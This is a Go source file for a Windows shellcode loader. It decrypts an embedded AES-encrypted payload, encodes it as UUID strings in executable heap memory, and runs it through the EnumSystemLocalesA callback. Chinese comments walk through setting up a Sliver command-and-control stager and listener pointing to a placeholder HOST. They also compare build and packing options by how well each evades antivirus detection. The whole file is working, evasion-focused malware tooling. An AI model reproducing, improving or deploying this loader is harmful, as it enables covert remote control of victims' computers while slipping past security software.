package main

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"encoding/base64"
	"encoding/binary"
	"github.com/google/uuid"
	"syscall"
	"unsafe"
)

//go:embed aesBase64Code.gzip
var content []byte

//go:embed aesKey.gzip
var key []byte

func codeToUUID(code []byte) ([]string, error) {
	if 16-len(code)%16 < 16 {
		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(code)%16)
		code = append(code, pad...)
	}
	var uuids []string
	for i := 0; i < len(code); i += 16 {
		var uuidBytes []byte
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(code[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(code[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(code[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)
		uuidBytes = append(uuidBytes, code[i+8:i+16]...)
		u, _ := uuid.FromBytes(uuidBytes)
		uuids = append(uuids, u.String())
	}
	return uuids, nil
}

func build(ddm string) { //buildEtwpCreateEtwThread
	code, _ := base64.StdEncoding.DecodeString(ddm)
	uuids, _ := codeToUUID(code)
	kernel32 := syscall.NewLazyDLL("kernel32")
	rpcrt4 := syscall.NewLazyDLL("Rpcrt4.dll")
	heapCreate := kernel32.NewProc("HeapCreate")
	heapAlloc := kernel32.NewProc("HeapAlloc")
	enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
	uuidFromString := rpcrt4.NewProc("UuidFromStringA")
	heapAddr, _, _ := heapCreate.Call(0x00040000, 0, 0)
	addr, _, _ := heapAlloc.Call(heapAddr, 0, 0x00100000)
	addrPtr := addr
	for _, uuuid := range uuids {
		u := append([]byte(uuuid), 0)
		_, _, _ = uuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)
		addrPtr += 16
	}
	_, _, _ = enumSystemLocalesA.Call(addr, 0)
}

func UnPaddingText1(str []byte) []byte {
	n := len(str)
	count := int(str[n-1])
	newPaddingText := str[:n-count]
	return newPaddingText
}

func DecrptogAES(src, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	blockMode := cipher.NewCBCDecrypter(block, key)
	blockMode.CryptBlocks(src, src)
	src = UnPaddingText1(src)
	return src
}

func GzipDecode(input []byte) ([]byte, error) {
	bytesReader := bytes.NewReader(input)
	gzipReader, err := gzip.NewReader(bytesReader)
	if err != nil {
		return nil, err
	}
	defer func() { _ = gzipReader.Close() }()
	buf := new(bytes.Buffer)
	if _, err := buf.ReadFrom(gzipReader); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func main() {
	ct, _ := GzipDecode(content)
	kk, _ := GzipDecode(key)
	baseByte, _ := base64.StdEncoding.DecodeString(string(ct))
	build(string(DecrptogAES(baseByte, kk)))
}

//sliver初次配置
//profiles new --mtls HOST --format raw --arch amd64 win64
//profiles
//mtls
//jobs

//配置监听
//stage-listener --url tcp://HOST:8443 --profile win64
//jobs

//生成shellcode
//generate stager --lhost HOST --lport 8443 --arch amd64 --format raw --save ./raw_shellcode
//base64 -w 0 -i raw_shellcode > stager.bs64

//go run aes.go

//免杀效果拉跨
//garble -literals -tiny -seed=random build -ldflags="-w -s -H windowsgui" ./main.go

//免杀效果好
//go build -ldflags="-w -s -H windowsgui" ./main.go

//压缩,upx压缩之后容易被查杀
//upx.exe -9 -q -o zip.exe main.exe
